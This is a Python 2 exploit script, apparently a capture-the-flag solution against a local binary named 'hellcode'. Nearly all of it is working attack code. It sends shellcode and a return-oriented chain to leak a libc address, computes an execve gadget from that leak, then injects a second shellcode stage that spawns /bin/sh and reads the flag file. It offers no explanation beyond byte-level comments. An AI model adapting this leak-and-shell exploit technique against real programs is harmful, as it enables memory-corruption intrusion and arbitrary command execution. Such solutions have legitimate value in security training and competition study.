
#!/usr/bin/python2

import time
import subprocess
from struct import pack as p

# depends on c lib
OFFMAGIC    = 0x788b0  
REENTER     = 0x400996 
GOTGETGID   = 0x602068
POPRDI      = 0x0000000000400c23 # pop rdi ; ret
PLTPUT      = 0x00000000004007a0


p0 = subprocess.Popen(['./hellcode'], stdin=subprocess.PIPE, stdout=subprocess.PIPE)

raw_input("ready!\n")

payload  = "\x68\x10\x08\x40\x00\x54\x5f\x48\x8b\x14\x25\xb0\x20\x60\x00\xc3"
					#68 10 08 40 00 					push 0x400810
					#54 								push rsp
					#5f 								pop  rdi
					#48 8b 14 25 b0 20 60 00			mov rdx, QWORD PTR ds:0x6020b0
					#c3									ret
payload += "/bin/sh\x00"
payload += p("<Q", POPRDI)
payload += p("<Q", GOTGETGID)
payload += p("<Q", PLTPUT)
payload += p("<Q", REENTER)

payload += "/bin/sh\x00" 
payload += "\x00\x00\x00\x00\x00\x00\x00\x00" 
payload += "\x00\x00\x00\x00\x00\x00\x00\x00"

print p0.stdout.readline()
p0.stdin.write(payload+"\n")
d = p0.stdout.readline().split("Please enter your code: ")[1][:-1]
leak = int(d[::-1].encode('hex'), 16)
magic = leak - OFFMAGIC
print "Leak getgid() == " + hex(leak)
print "Magic(execve()) is at == " + hex(magic)

payload = "\x48\x8d\x7c\x24\x50"
payload  += "\x48\xbb"
payload  += p("<Q", magic) # magic
payload += "\x53\xc3"
					#48 8d 7c 24 50						lea rdi, [rsp+0x50]
					#48 bb 00 00 00 00 00 00 00 00 		movabs rbx, magic
					#53 								push rbx
					#c3									ret
p0.stdin.write(payload + "\n")

print p0.stdin.write("cat flag\n")

while True:
    time.sleep(1)
	print p0.stdin.write("cat flag\n")
    print p0.stdout.readline()